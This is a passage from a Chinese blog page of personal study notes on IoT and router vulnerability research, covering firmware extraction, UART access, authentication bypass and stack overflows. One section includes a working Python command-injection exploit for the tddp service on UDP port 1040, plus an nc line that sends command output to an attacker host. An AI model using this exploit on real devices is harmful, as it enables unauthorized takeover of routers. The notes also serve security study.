@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[TOC] IOT安全-文章学习笔记-2CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析https://www.anquanke.com/post/id/250724  概要：静态资源路径的认证绕过、解密获取token、ping功能注入（猜的）、telnetd开关的配置项 用.w 为后缀的固件文件 由于漏洞是身份认证绕过漏洞，因此首先要确定设备的身份验证相关的函数有哪些 三">
+<meta name="keywords" content="路由器,漏洞分析,栈溢出,摄像头,命令注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IOT安全-文章学习笔记-2">
+<meta property="og:url" content="http://21guns.top/2021/06/21/iot/IOT安全-文章学习笔记-2/index.html">
+<meta property="og:site_name" content="have a nice day">
+<meta property="og:description" content="[TOC] IOT安全-文章学习笔记-2CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析https://www.anquanke.com/post/id/250724  概要：静态资源路径的认证绕过、解密获取token、ping功能注入（猜的）、telnetd开关的配置项 用.w 为后缀的固件文件 由于漏洞是身份认证绕过漏洞，因此首先要确定设备的身份验证相关的函数有哪些 三">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2022-02-21T08:00:09.100Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="IOT安全-文章学习笔记-2">
+<meta name="twitter:description" content="[TOC] IOT安全-文章学习笔记-2CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析https://www.anquanke.com/post/id/250724  概要：静态资源路径的认证绕过、解密获取token、ping功能注入（猜的）、telnetd开关的配置项 用.w 为后缀的固件文件 由于漏洞是身份认证绕过漏洞，因此首先要确定设备的身份验证相关的函数有哪些 三">
+
+<link rel="canonical" href="http://21guns.top/2021/06/21/iot/IOT安全-文章学习笔记-2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>IOT安全-文章学习笔记-2 | have a nice day</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">have a nice day</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/06/21/iot/IOT安全-文章学习笔记-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="21Guns">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="have a nice day">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          IOT安全-文章学习笔记-2
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-21 09:23:44" itemprop="dateCreated datePublished" datetime="2021-06-21T09:23:44+08:00">2021-06-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-21 16:00:09" itemprop="dateModified" datetime="2022-02-21T16:00:09+08:00">2022-02-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>[TOC]</p>
+<h1 id="IOT安全-文章学习笔记-2"><a href="#IOT安全-文章学习笔记-2" class="headerlink" title="IOT安全-文章学习笔记-2"></a>IOT安全-文章学习笔记-2</h1><h2 id="CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析"><a href="#CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析" class="headerlink" title="CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析"></a>CVE-20220090（华硕DSL-AC3100）身份验证绕过漏洞分析</h2><p><a href="https://www.anquanke.com/post/id/250724" target="_blank" rel="noopener">https://www.anquanke.com/post/id/250724</a></p>
+<ul>
+<li>概要：静态资源路径的认证绕过、解密获取token、ping功能注入（猜的）、telnetd开关的配置项</li>
+<li>用.w 为后缀的固件文件</li>
+<li>由于漏洞是身份认证绕过漏洞，因此首先要确定设备的身份验证相关的函数有哪些</li>
+<li>三种情况：0-验证通过、超时重新认证、2-新用户故需要认证</li>
+<li>逻辑运算符&amp;&amp; 的优先级大于 ||</li>
+<li>逻辑或，前面条件为真，则不看后者，即可以跳过evaluate_access</li>
+<li>仅认证绕过还不够，还需httoken，httoken 是设备的token值，在服务端进行生成，然后前端js 中进行解密，最终向服务器请求的时候，将httoken加入到请求数据中</li>
+<li>很多的网络设备中在ping网络诊断 这个功能中，出现过大量的历史漏洞</li>
+<li>/sbin/arc_telnetd 文件中：获取ARC_TELNETD_ENABLE的值，当值为1的时候，设备会开启telnetd</li>
+<li>通过前端静态资源的路径，来绕过身份验证</li>
+</ul>
+<h2 id="NetGear-夜鹰-RAX40V2-设备与固件分析"><a href="#NetGear-夜鹰-RAX40V2-设备与固件分析" class="headerlink" title="NetGear 夜鹰 RAX40V2 设备与固件分析"></a>NetGear 夜鹰 RAX40V2 设备与固件分析</h2><p><a href="https://www.anquanke.com/post/id/248900" target="_blank" rel="noopener">https://www.anquanke.com/post/id/248900</a></p>
+<ul>
+<li>概要：通过uart进入shell、开启telnet/修改密码获取网络层shell（uart是硬件层）、从设备中提取出文件系统、ubi提取固件</li>
+<li>NetGear路由器：自带UART接口且已标明、波特率一般为115200</li>
+<li>识别usb：ls -ll /dev/tty</li>
+<li>识别波特率：devttys0 的小工具baudrate.py</li>
+<li>minicom保存串口log 为文件（未说明，自行搜索）</li>
+<li>弱口令进入uart的shell，但命令受限，类似这种低权限的shell，输入sh、\bin\sh、bash等命令可能会获取完整版的shell</li>
+<li>telnet常见可执行文件：telnetd、utelnetd（之前还遇到过dropbear）</li>
+<li>telnetd与UART，二者shell的用户名/密码可能不同</li>
+<li>直接更改admin 用户的密码为空，原来：<code>admin:x:0:0:admin:/:/bin/sh</code>，改后<code>admin::0:0:admin:/:/bin/sh</code>（直接留空）</li>
+<li>提取fs：cat /proc/mtd，可见mtd11对应rootfs-ubifs，可直接dd提取，dd if=/dev/mtd11 of=/tmp/rootfs_ubifs.bin（只if/of无需其它参数）</li>
+<li>提取nvram，nvram show &gt; nvram.bin</li>
+<li>解开ubi 文件有两种方法：挂载、使用 ubi_reader 套件</li>
+</ul>
+<h2 id="CVE-2020-26567-DSR-250N-远程拒绝服务漏洞分析"><a href="#CVE-2020-26567-DSR-250N-远程拒绝服务漏洞分析" class="headerlink" title="CVE-2020-26567 DSR-250N 远程拒绝服务漏洞分析"></a>CVE-2020-26567 DSR-250N 远程拒绝服务漏洞分析</h2><p><a href="https://www.anquanke.com/post/id/247049" target="_blank" rel="noopener">https://www.anquanke.com/post/id/247049</a></p>
+<ul>
+<li>概要：手动提取squashfs、cgi中有reboot导致拒绝服务、httpd与cgi、cgi如何触发及未授权访问???</li>
+<li>手动提取squashfs<ul>
+<li>常见的头部特征：sqsh、hsqs、qshs、shsq、hsqt、tqsh、sqlz。</li>
+<li>确定squashfs文件系统的大小：从 “hsqs”开始 dump 出一段数据（一般头部校验不超过100字节），file 命令查看</li>
+</ul>
+</li>
+<li>拒绝服务：<ul>
+<li>漏洞文件：upgradeStatusReboot.cgi中有reboot命令</li>
+<li>如何触发：cgi文件伴随着http服务，找到web组件httpd，其调用路径：/etc/init.d/rcS、/etc/platformInit、sslvpnInit、httpd和httpkeepAlive.sh（前者的守护进程）</li>
+<li>如何触发2：httpd在启动时会加载upgradeStatusReboot.cgi，且不需要授权就可访问（未授权访问是怎么体现的？启动时加载cgi就会被调用？）</li>
+</ul>
+</li>
+<li>dsr-500<ul>
+<li>thttpdInit：thttpd和httpkeepAlive.sh</li>
+<li>kepler.config：定义了THHTP_CGI_PATTERN=”platfor.cgi|upgradeStatusReboot.cgi”</li>
+<li>thttpd启动参数：thttpd -c THHTP_CGI_PATTERN，c指定了那些cgi文件（说明这些cgi可以未授权访问？）</li>
+</ul>
+</li>
+<li><p>二者不同：250中httpd中加载了cgi文件，500中启动thttpd时参数指定了cgi</p>
+</li>
+<li><p>userInit 中，根据Country 设置安全等级，地区不同，漏洞触发点也不同</p>
+</li>
+</ul>
+<h2 id="Linksys-EA6100-固件解密分析"><a href="#Linksys-EA6100-固件解密分析" class="headerlink" title="Linksys EA6100 固件解密分析"></a>Linksys EA6100 固件解密分析</h2><p><a href="https://www.anquanke.com/post/id/246659" target="_blank" rel="noopener">https://www.anquanke.com/post/id/246659</a></p>
+<ul>
+<li>概要：中间版本（未加密）可解密最新版本（加密）、gpg解密固件</li>
+<li>从固件后缀名中获取信息<ul>
+<li>以 “ .gpg.img” 为结尾的固件包，正常的固件包是以 “img”、“bin”、“chk” 为结尾</li>
+<li>gpg：为文件生成签名、管理密钥以及验证签名的工具</li>
+<li>固件可能是使用GPG生成的密钥进行加密的</li>
+</ul>
+</li>
+<li>判定加密；熵值、binwalk、file</li>
+<li>固件下载页面的提示<ul>
+<li>更新最新固件的时候，需要先下载 Ver. 1.1.5 (Build 172244) 作为中间件</li>
+<li>最新固件被加密，中间版本未加密（无gpg后缀）</li>
+<li>中间版本用于提供密钥来解密最新的固件</li>
+</ul>
+</li>
+<li>gpg密钥<ul>
+<li>gpg参数k， -k, –list-keys            列出密钥</li>
+<li>其它密钥保存格式：BEGIN RSA PRIVATE KEY私钥内容、BEGIN CERTIFICATE证书信息</li>
+<li>搜索BEGIN RSA，找到密钥文件keydata</li>
+</ul>
+</li>
+<li>gpg解密固件：import参数导入密钥、decrypt参数解密</li>
+</ul>
+<h2 id="NetGear-R7000P-路由器栈溢出漏洞硬件调试与分析"><a href="#NetGear-R7000P-路由器栈溢出漏洞硬件调试与分析" class="headerlink" title="NetGear R7000P 路由器栈溢出漏洞硬件调试与分析"></a>NetGear R7000P 路由器栈溢出漏洞硬件调试与分析</h2><ul>
+<li>概要：memcpy栈溢出、万用表识别uart、dslogic识别波特率、动态调试</li>
+<li><p>确定uart</p>
+<ul>
+<li>gnd：指针wifi符号，黑色接地或任意金属，红色挨个试，听到声音便是（通导性测试）</li>
+<li>vcc：指针20v，黑色接地，红色挨个试，出现最大电压值便是（若结果有两个，再与gnd相接，能重启便是）</li>
+<li>tx/rx：指针20v，黑色接gnd，设备启动时，电压增大并保持不变是tx，电压为0是rx</li>
+</ul>
+</li>
+<li><p>波特率3法：挨个试、python脚本、dslogic等硬件</p>
+</li>
+<li><p>dslogic使用</p>
+<ul>
+<li>接线：通道1接tx，黑色接gnd</li>
+<li>pc上xcom软件模拟路由器</li>
+<li>dslogic配套软件dsview</li>
+<li>具体使用待学习</li>
+</ul>
+</li>
+</ul>
+<h2 id="一次嵌入式固件逆向实践"><a href="#一次嵌入式固件逆向实践" class="headerlink" title="一次嵌入式固件逆向实践"></a>一次嵌入式固件逆向实践</h2><ul>
+<li>目录</li>
+<li>ppc指令<ul>
+<li>cmplwi-无符号立即数字比较：cmp-比较、l-无符号、w-word字、i-立即数、</li>
+<li>slwi：slwi r0, r0, 8，即r0 = r0 &lt;&lt; 8，逻辑左移</li>
+<li>addis：立即数左移16位后跟寄存器内容相加，s后缀表示左移16位</li>
+</ul>
+</li>
+<li>法一：r11 = 0x70000+r3*4-0x4F0，即 jmp-基址+偏移 到跳转表，当r3为0即找第一个case</li>
+<li>法二：最后一个跳转地址后面应该是第一个case语句跳转地址，即跳转表后紧跟着case代码块</li>
+<li>sig库函数识别未实践过</li>
+</ul>
+<h2 id="DLink路由器固件的一次分析记录"><a href="#DLink路由器固件的一次分析记录" class="headerlink" title="DLink路由器固件的一次分析记录"></a>DLink路由器固件的一次分析记录</h2><ul>
+<li>7z解压yyds</li>
+<li>hnap基于http-soap，http协议中soapaction字段来表示不同的hnap请求，uri为/HNAP1</li>
+<li>基础认证：请求头与环境变量的对应<ul>
+<li>http请求中的基础认证，Authorization：Basic YWMEHZY+</li>
+<li>环境变量中，http_hnap_auth = getenv(“HTTP_HNAP_AUTH”);</li>
+</ul>
+</li>
+<li>过程：cgibin程序、hnap_handler、getenv、处理env_value、3处发生漏洞</li>
+<li>C 库函数 char <em>strtok(char </em>str, const char *delim) 分解字符串 str, delim 为分隔符。<ul>
+<li>该函数返回被分解的第一个子字符串，如果没有可检索的字符串，则返回一个空指针。</li>
+<li>在第一次调用时，strtok()必需给予参数s 字符串，往后的调用则将参数s 设置成NULL<br>v22 = strtok(http_hnap_auth, “ “); # 第一次调用需给定s字符串<br>src = strtok(0, “ “); # 往后的调用s设置为null<br>假如原来为basic xxx,则第一次返回basic,第二次返回xxx</li>
+</ul>
+</li>
+<li>atoi：atoi函数对于诸如此类的字符串:“12aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa”同样会成功的返回12</li>
+</ul>
+<h2 id="iot初体验-智能设备"><a href="#iot初体验-智能设备" class="headerlink" title="iot初体验-智能设备"></a>iot初体验-智能设备</h2><ul>
+<li>思路：编程器连接flash获取固件、修改固件中uboot等待时间并刷回、uart连接并进入uboot</li>
+<li>串口有两种标准，ttl和rs232，usb2ttl即将ttl的转为usb</li>
+<li>那个xmc是flash，没有拆下来，直接接线连的编程器，提固件</li>
+<li>识别出5个型号，不知道哪个就直接最后一个，猜？</li>
+<li>固件内uboot（0-31000）挨着kernel（31000-）</li>
+<li>不用非得dd提取出uboot再分析，直接拉入ida设置load size即可</li>
+<li>判定基址时，差正好是20？怎么就判定是00那个而非20？（等作者解答，解答：jumptables中每个地址长度是4，103D0-103B0=0x20/4=8。，还是没懂）</li>
+<li>怎么判断那个函数是等待时间的？仅凭文中代码不足以吧？</li>
+</ul>
+<h2 id="IoT设备固件分析教程之固件是怎么存储的"><a href="#IoT设备固件分析教程之固件是怎么存储的" class="headerlink" title="IoT设备固件分析教程之固件是怎么存储的"></a>IoT设备固件分析教程之固件是怎么存储的</h2><ul>
+<li>名词：pcb-印刷电路板、soc片上系统</li>
+<li>芯片识别：标签、封装/电路设计</li>
+<li>nor与nand、emmc与ufs、</li>
+<li>多种类型的存储器、不同类型的数据</li>
+</ul>
+<h2 id="记一次网关设备的pwn"><a href="#记一次网关设备的pwn" class="headerlink" title="记一次网关设备的pwn"></a>记一次网关设备的pwn</h2><ul>
+<li>整体讲的比较粗，对新手不友好：模拟、exp、获取imagebase都没有详细步骤，等回头再来</li>
+<li>修改html标签属性就能打开telnet？</li>
+<li>mips流水线效应，jalr后的mov a2,s0优先执行</li>
+<li>mips返回地址，$ra，return address（截图中没显示）</li>
+<li>没必要非从理论上说明会栈溢出，直接调试跑一波即可验证（如果从理论上讲，sscanf导致从v4到a2，a2是参数，按照x86的参返旧局，参数被覆盖后并不会覆盖到返回地址，何况在此还不清楚mips函数调用时栈到底怎么排布）</li>
+<li>exp怎么构造的？没细讲，也许是一边调试一边构造的，硬看不好理解</li>
+<li>imagebase查看？：ida下断main、qemu的strace参数，没懂</li>
+</ul>
+<h2 id="2018-年-IoT-那些事儿"><a href="#2018-年-IoT-那些事儿" class="headerlink" title="2018 年 IoT 那些事儿"></a>2018 年 IoT 那些事儿</h2><ul>
+<li>概述：非技术文章、详见原文目录</li>
+<li><p>现状</p>
+<ul>
+<li>IoT 设备会越来越多，IoT 恶意样本数量爆炸式增长</li>
+<li>被攻击后的设备，通常会进入黑客的武器库。</li>
+<li>蠕虫感染或者自主的批量攻击来控制批量目标设备，构建僵尸网络</li>
+<li>路由器、摄像头和智能电视被攻击频率最高</li>
+</ul>
+</li>
+<li><p>IoT 攻击源</p>
+<ul>
+<li>欧美：IoT 恶意代码控制服务器的家乡</li>
+<li>中国： IoT 攻击活动最频发的国家，也是最大的受害国</li>
+<li>国内 ：与 GDP有关联性</li>
+</ul>
+</li>
+<li><p>DDoS是IoT 恶意软件的主流功能，受青睐的四个原因：</p>
+<ul>
+<li>几何级数暴增</li>
+<li>跨多平台传播</li>
+<li>TB 级流量攻击</li>
+<li>慢速 CC 攻击</li>
+</ul>
+</li>
+<li><p>攻击方式：</p>
+<ul>
+<li>利用服务器进行集中式扫描攻击，并向 IoT 设备植入恶意软件</li>
+<li>通过蠕虫传播攻击，如弱口令和漏洞利用</li>
+</ul>
+</li>
+<li><p>IoT 安全趋势：</p>
+<ul>
+<li>针对 IoT 设备的攻击量将远远超过其他攻击目标</li>
+<li>传统安全的防御形式被打破，迫使安全厂商思考新的防御思路</li>
+<li>被攻击 IoT 的设备将呈现多样化</li>
+<li>IoT 设备将成为恶意挖矿软件和勒索软件的下一个目标</li>
+<li>攻击将越来越专业化，政治目的的攻击变多</li>
+</ul>
+</li>
+<li><p>防护建议</p>
+<ul>
+<li>个人用户：修改默认密码、更新固件、不将端口向互联网开放</li>
+<li>IoT 厂商：安全启动（通过证书来验证程序）、及时打补丁、云端服务器安全（数据和服务）、加密实现数据安全、动态密钥而非硬编码</li>
+</ul>
+</li>
+</ul>
+<h2 id="由一道工控路由器固件逆向题目看命令执行漏洞"><a href="#由一道工控路由器固件逆向题目看命令执行漏洞" class="headerlink" title="由一道工控路由器固件逆向题目看命令执行漏洞"></a>由一道工控路由器固件逆向题目看命令执行漏洞</h2><p><a href="https://www.anquanke.com/post/id/183202" target="_blank" rel="noopener">https://www.anquanke.com/post/id/183202</a></p>
+<ul>
+<li>处理 tddp 协议的二进制文件：usr/bin/tddp、UDP的1040 端口</li>
+<li><p>漏洞点：</p>
+<ul>
+<li>switch-case的 0x31分支，即 <code>CMD_FTEST_CONFIG</code> </li>
+<li>sscanf 函数解析后，拼接到 run_exec 函数，过滤不严，只判断了 ; 字符，没有过滤 &amp; 和 | </li>
+<li>run_exec 函数，调用了 execve 进行命令执行</li>
+<li>回溯输入点：recvfrom 函数接收 socket 数据</li>
+</ul>
+</li>
+<li><p>根据代码，构造出结构体空间布局</p>
+</li>
+<li><p>nmap 的 UDP 扫描，1040是开放的，TCP 扫描则端口是关闭的</p>
+</li>
+<li><p>exp</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">tddp_port = <span class="number">1040</span></span><br><span class="line">recv_port = <span class="number">12345</span></span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">command = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">s_send = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>)<span class="comment"># UDP 的 socket</span></span><br><span class="line">s_recv = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s_recv.bind((<span class="string">''</span>,<span class="number">12345</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'x01x31'</span>.ljust(<span class="number">12</span>,<span class="string">'x00'</span>) <span class="comment"># 前两个字节\0x1\0x31，中间要填充 10，原因是v21指针会后移 12 位</span></span><br><span class="line">payload+= <span class="string">"123|%s&amp;&amp;echo ;123"</span>%(command)<span class="comment"># ;后还要填充字符，因为sscanf后,会判断 ; 后面的内容是否为空</span></span><br><span class="line"></span><br><span class="line">s_send.sendto(payload,(ip,tddp_port))</span><br><span class="line">s_send.close()</span><br><span class="line"></span><br><span class="line">res,addr = s_recv.recvfrom(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>命令执行回显结果</p>
+<ul>
+<li><p>telnetd：能够连接上，但执行命令失败，因为远程没有用于 telnet 服务的终端</p>
+</li>
+<li><p>nc：尝试用 nc 来弹shell ，但nc被阉割</p>
+</li>
+<li>nc：将命令的内容正向连接来输出，本地监听nc -nvlp 6666，命令为”uname|nc ip 6666”，执行结果就会显示在本地</li>
+</ul>
+</li>
+<li><p>另一个洞：注入一个合法的 lua 脚本，让程序去访问也可执行命令</p>
+</li>
+</ul>
+<h2 id="强网杯2020决赛-ciscoRV110W-web服务漏洞复现"><a href="#强网杯2020决赛-ciscoRV110W-web服务漏洞复现" class="headerlink" title="强网杯2020决赛 ciscoRV110W web服务漏洞复现"></a>强网杯2020决赛 ciscoRV110W web服务漏洞复现</h2><ul>
+<li>确定目标程序：grep字符串（配置页面的url即/login.cgi）、netstat看443端口对应进程，再find找出差呢刚需</li>
+<li>漏洞对比找到sscanf</li>
+<li>分析程序，找到漏洞触发的请求，远程调试确定偏移</li>
+<li>ret2libc+shellcode：msfvenom生成shellcode、利用多线程同一个脚本中攻击及接受反弹shell</li>
+</ul>
+<h2 id="路由器篡改固件添加后门"><a href="#路由器篡改固件添加后门" class="headerlink" title="路由器篡改固件添加后门"></a>路由器篡改固件添加后门</h2><ul>
+<li>目录</li>
+<li>bindshell后门</li>
+<li>其他均常规操作，平平无奇</li>
+</ul>
+<h2 id="通过设备UART接口调试获取shell"><a href="#通过设备UART接口调试获取shell" class="headerlink" title="通过设备UART接口调试获取shell"></a>通过设备UART接口调试获取shell</h2><ul>
+<li>目录</li>
+<li>uart识别未实践过、芯片查询网站</li>
+<li>揭秘一书中：<ul>
+<li>目测法（vcc方形、gnd多条线）</li>
+<li>测试法（vcc电压稳定、gnd电阻为0、txd电压下降、rxd排除法</li>
+</ul>
+</li>
+</ul>
+<h2 id="IoT漏洞研究（一）固件基础"><a href="#IoT漏洞研究（一）固件基础" class="headerlink" title="IoT漏洞研究（一）固件基础"></a>IoT漏洞研究（一）固件基础</h2><ul>
+<li>IOT固件分两类<ul>
+<li>存在文件系统，基于linux/BSD</li>
+<li>固件是一个整体，即RTOS，Real-time operating system</li>
+</ul>
+</li>
+<li><p>存在文件系统</p>
+<ul>
+<li>UBI</li>
+<li>PFS</li>
+<li>Openwrt Lua</li>
+</ul>
+</li>
+<li><p>RTOS</p>
+<ul>
+<li>固件本身就是一个可执行文件，不存在文件系统，启动后直接加载运行</li>
+<li>RTOS的分析最重要两点：程序入口、 程序符号</li>
+<li>vxworks</li>
+<li>U-boot</li>
+<li>Chip firmware</li>
+</ul>
+</li>
+<li>Chip firmware<ul>
+<li>有些IOT固件没有资料，逆向困难，需要对固件整体分析</li>
+<li>0x100的位置：都是0x2xxxxx，既非代码也非数据，推测是地址，即此处是地址表</li>
+<li>猜测基址为0x200000，rebase后，识别出许多类似函数名的字符串</li>
+<li>搜索字符串地址，固件中找到，结合基址找到在IDA中位置，即字符串表</li>
+<li>如上，地址表，字符串表都是重要线索</li>
+</ul>
+</li>
+<li>未完待续</li>
+</ul>
+<h2 id="僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现"><a href="#僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现" class="headerlink" title="僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现"></a>僵尸网络攻击之王（Mozi）之Netgear路由器漏洞复现</h2><ul>
+<li>sprintf+system命令注入</li>
+<li>分号拼接命令</li>
+<li>cmd溯源到用户输入</li>
+<li>源追溯，依据printf函数，判定为uri</li>
+</ul>
+<h2 id="复现影响79款Netgear路由器高危漏洞"><a href="#复现影响79款Netgear路由器高危漏洞" class="headerlink" title="复现影响79款Netgear路由器高危漏洞"></a>复现影响79款Netgear路由器高危漏洞</h2><ul>
+<li>概述：栈溢出、串口连接、00绕strcmp、rop链</li>
+<li>串口连接：<ul>
+<li>Hyper Terminal软件、TTL转USB转接板</li>
+<li>一般情况：1-连接杜邦线-router、2-连接USB-pc、3-打开Hyper Terminal、4-开启路由器、5-Hyper Terminal显示数据</li>
+<li>有时会获取不到信息，故先usb再杜邦线-先2后1，有类似的坑</li>
+</ul>
+</li>
+<li>exp<ul>
+<li>strcmp(src,”*#</li>
+<li>函数返回：pop {R4-R11, PC}</li>
+<li>栈布局：a、b、c</li>
+<li>ROP：MOV R0,SP; BL system</li>
+<li>a给R4-R11、b给PC、pop完ab后，SP执行c，即system的R0即cmd</li>
+</ul>
+</li>
+<li>ROP<ul>
+<li>优先本程序，其次libc</li>
+<li>找MOV R0,SP类似的rop</li>
+<li>1：栈布局+函数返回，能控制sp指向cmd</li>
